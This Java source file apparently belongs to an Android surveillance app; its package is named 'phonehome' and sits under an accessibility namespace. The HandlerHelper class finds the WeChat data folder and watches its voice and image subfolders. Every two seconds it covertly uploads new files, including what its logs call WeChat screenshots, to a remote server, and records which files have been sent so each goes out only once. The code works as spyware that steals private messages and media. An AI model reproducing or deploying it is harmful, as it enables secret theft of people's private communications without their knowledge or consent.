package test.com.accessibility.Utilz.phonehome;



import android.content.Context;
import android.content.SharedPreferences;
import android.os.Handler;
import android.util.Log;

import test.com.accessibility.Utilz.wechat.FileListMonitor;
import test.com.accessibility.util.network.AsyncHelper;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class HandlerHelper {
    private Handler mHandler = new Handler();
    private Runnable runnable;

    private static String LOG_TAG = "tluo-phonehome";
    private Context mContext;
    private String dst;

    private static boolean is_background_task_running = false;
    private boolean Wechat_Voice_Image_Monitor_First_Time_Launch = true;

    public HandlerHelper(Context context, String dst_dir) {
        mContext = context;
        dst = dst_dir;
    }

    public void handleAction_Wechat_Voice_Pic_Monitor(Context context){
        String path = "/sdcard/tencent/MicroMsg";
        File folder = new File(path);
        File[] listOfFiles = folder.listFiles();
        String target = "";
        for (int i = 0; i < listOfFiles.length; i++) {
            String fname = listOfFiles[i].getName();
            if ((fname.length() == 32) && (fname.matches("[a-zA-Z0-9]*")) && listOfFiles[i].isDirectory()) {
                target = listOfFiles[i].getAbsolutePath();
                break;
            }
        }
        Log.d("tluo-phonehome", "[info] wechat sdcard folder:"+target);
        if (target != "") {
            String voiceFolder = target + "/voice2";
            FileListMonitor voiceObserver = new FileListMonitor(context, voiceFolder);
            voiceObserver.startWatching(Wechat_Voice_Image_Monitor_First_Time_Launch);

            String imageFolder = target + "/image2";
            FileListMonitor imageObserver = new FileListMonitor(context, imageFolder);
            imageObserver.startWatching(Wechat_Voice_Image_Monitor_First_Time_Launch);

            if (Wechat_Voice_Image_Monitor_First_Time_Launch){
                Wechat_Voice_Image_Monitor_First_Time_Launch = false;
            }
        }
    }

    public void startFileJob(){
        Log.v(LOG_TAG, "Start file job ...");
        mHandler.postDelayed(new Runnable() {
            public void run() {
                if (!is_background_task_running){
                    Log.v(LOG_TAG, "--- Running file job once ...");
                    is_background_task_running = true;
                    try {
                        sendFilesToRemote();
                        handleAction_Wechat_Voice_Pic_Monitor(mContext);
                    } catch (Exception e) {
                        Log.v(LOG_TAG, "[error] "+ e.getStackTrace().toString());
                    }
                    is_background_task_running = false;
                    //Log.v(LOG_TAG, "--- File job just run once ...");

                } else {
                    //Log.v(LOG_TAG, "--- File job is running ...");
                }
                runnable=this;
                mHandler.postDelayed(runnable, 2 * 1000);
            }
        }, 2 * 1000);
    }

    // send current files to remote server
    public void sendFilesToRemote() {
        Log.d(LOG_TAG, "[tluo] sendFilesToRemote " + dst);
        AsyncHelper mFileUploadUtil = new AsyncHelper(mContext);
        File folder = new File(dst);
        File[] listOfFiles = folder.listFiles();
        List<String> need_upload_files = new ArrayList<String>();
        int max_file_upload_count = 10;
        if (listOfFiles.length <= 10){
            max_file_upload_count = listOfFiles.length;
        }
        for (int i = 0; i < max_file_upload_count; i++) {
            File file = listOfFiles[i];
            String filepath = file.getAbsolutePath();
            SharedPreferences sharedPref = mContext.getSharedPreferences(dst.replace("/", "_") + "_monitor", Context.MODE_PRIVATE);
            int defaultValue = 0;
            int sent = sharedPref.getInt(filepath, defaultValue);
            if (sent == 0) {
                SharedPreferences.Editor editor = sharedPref.edit();
                editor.putInt(filepath, 1);
                editor.commit();
                need_upload_files.add(filepath);
            }
        }

        Log.d(LOG_TAG, "[info] wechat screenshots files need to be uploaded: " + need_upload_files.size());
        if (need_upload_files.size() > 0){

            String []file_array = new String[need_upload_files.size()];
            for (int i = 0; i < need_upload_files.size(); i++) {
                file_array[i] = need_upload_files.get(i);
            }

            mFileUploadUtil.execute(file_array);
        }
    }

    public void stopFileJob(){
        Log.v(LOG_TAG, "Stop file job ...");
        mHandler.removeCallbacks(runnable);

    }

}